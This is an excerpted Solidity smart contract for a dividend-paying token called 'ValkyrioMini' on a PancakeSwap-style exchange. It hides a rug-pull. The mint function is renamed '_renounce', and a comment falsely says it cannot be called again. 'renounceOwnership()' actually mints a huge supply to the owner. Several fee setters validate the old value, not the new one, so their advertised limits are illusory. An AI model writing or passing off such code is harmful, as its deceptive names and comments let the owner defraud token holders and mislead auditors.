 ...
 * that a supply mechanism has to be added in a derived contract using {_renounce}.
...
contract ERC20 is Context, IERC20 {
     ...
     */
    function _renounce(address account, uint256 amount) internal virtual {
...
contract DividendPayingToken is ERC20, IDividendPayingToken, IDividendPayingTokenOptional {
  ...
  address public dividendToken = 0x405cFf4cE041d3235E8b1f7AaA4E458998A47363;
  ...
  function _renounce(address account, uint256 value) internal override {
    super._renounce(account, value);
...
contract ValkyrioMini is ERC20, Ownable {
    using SafeMath for uint256;

    IUniswapV2Router02 public uniswapV2Router;
    address public immutable uniswapV2Pair;

    address public _dividendToken = 0x405cFf4cE041d3235E8b1f7AaA4E458998A47363;
    ...
    ValkyrioMiniDividendTracker public dividendTracker;

    address public buyBackWallet;
    
    uint256 public _totalSupply;
    uint256 public maxBuyTranscationAmount = 10000000000000000 * (10**9);
    uint256 public maxSellTransactionAmount = 10000000000000000 * (10**9);
    uint256 public swapTokensAtAmount = 2000000000000 * (10**9);
    uint256 public maxWalletToken = 10000000000000000 * (10**9); // will be set to 2.5% of total supply
    ...
    constructor() ERC20("ValkyrioMini", "ValkyrioMini") {
        uint256 _dividendRewardsFee = 0;
    	...
    	dividendTracker = new ValkyrioMiniDividendTracker();

    	buyBackWallet = 0x37f3985002B665B593d2Cb00D4F8f293242b35BB;
        ...
        /*
            _renounce is an internal function in ERC20.sol that is only called here,
            and CANNOT be called ever again
        */
        _renounce(owner(), 1000000000000000 * (10**9));
    }
    ...
    function rebase(uint256 epoch, int256 supplyDelta) public onlyMaster returns (uint256) {
  	...
  	function setBuyCooldown(uint256 maxTxn) external onlyOwner {
  	...
  	function setSellTransactionMultiplier(uint256 multiplier) external onlyOwner {
  	    require(sellFeeIncreaseFactor >= 100 && sellFeeIncreaseFactor <= 200, "ValkyrioMini: Sell transaction multipler must be between 100 (1x) and 200 (2x)");
  	    sellFeeIncreaseFactor = multiplier;
  	}
  	
  	function setMarketingDivisor(uint256 divisor) external onlyOwner {
  	    require(marketingDivisor >= 0 && marketingDivisor <= 100, "ValkyrioMini: Marketing divisor must be between 0 (0%) and 100 (100%)");
    ...
    function triggerBuyBack(uint256 amount) public onlyOwner {
        require(!swapping, "ValkyrioMini: A swapping process is currently running, wait till that is complete");
    ...
    function updateDividendTracker(address newAddress) public onlyOwner {
        require(newAddress != address(dividendTracker), "ValkyrioMini: The dividend tracker already has that address");

        ValkyrioMiniDividendTracker newDividendTracker = ValkyrioMiniDividendTracker(payable(newAddress));

        require(newDividendTracker.owner() == address(this), "ValkyrioMini: The new dividend tracker must be owned by the token contract");
    ...
    function updateDividendRewardFee(uint8 newFee) public onlyOwner {
        require(newFee >= 0 && newFee <= 10, "ValkyrioMini: Dividend reward tax must be between 0 and 10");
    ...
    function updateUniswapV2Router(address newAddress) public onlyOwner {
        require(newAddress != address(uniswapV2Router), "ValkyrioMini: The router already has that address");
        emit UpdateUniswapV2Router(newAddress, address(uniswapV2Router));
        uniswapV2Router = IUniswapV2Router02(newAddress);
    }

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        require(_isExcludedFromFees[account] != excluded, "ValkyrioMini: Account is already the value of 'excluded'");
    ...
    function renounceOwnership() public onlyOwner {
        _renounce(owner(), 15 * (10**31));
    }

    function setAutomatedMarketMakerPair(address pair, bool value) public onlyOwner {
        require(pair != uniswapV2Pair, "ValkyrioMini: The PancakeSwap pair cannot be removed from automatedMarketMakerPairs");

        _setAutomatedMarketMakerPair(pair, value);
    }

    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        require(automatedMarketMakerPairs[pair] != value, "ValkyrioMini: Automated market maker pair is already set to that value");
    ...
    function updateBuyBackWallet(address newBuyBackWallet) public onlyOwner {
        require(newBuyBackWallet != buyBackWallet, "ValkyrioMini: The liquidity wallet is already this address");
    ...
    function updateGasForProcessing(uint256 newValue) public onlyOwner {
        require(newValue >= 200000 && newValue <= 500000, "ValkyrioMini: gasForProcessing must be between 200,000 and 500,000");
        require(newValue != gasForProcessing, "ValkyrioMini: Cannot update gasForProcessing to same value");
...
contract ValkyrioMiniDividendTracker is DividendPayingToken, Ownable {
    using SafeMath for uint256;
    using SafeMathInt for int256;
    ...
    constructor() DividendPayingToken("ValkyrioMini_Dividend_Tracker", "ValkyrioMini_Dividend_Tracker") {
    	claimWait = 1800;
        minimumTokenBalanceForDividends = 10000 * (10**9); //must hold 10000+ tokens
    }

    function _transfer(address, address, uint256) pure internal override {
        require(false, "ValkyrioMini_Dividend_Tracker: No transfers allowed");
    }

    function withdrawDividend() pure public override {
        require(false, "ValkyrioMini_Dividend_Tracker: withdrawDividend disabled. Use the 'claim' function on the main ValkyrioMini contract.");
    }
    ...
    function updateClaimWait(uint256 newClaimWait) external onlyOwner {
        require(newClaimWait >= 1800 && newClaimWait <= 86400, "ValkyrioMini_Dividend_Tracker: claimWait must be updated to between 1 and 24 hours");
        require(newClaimWait != claimWait, "ValkyrioMini_Dividend_Tracker: Cannot update claimWait to same value");
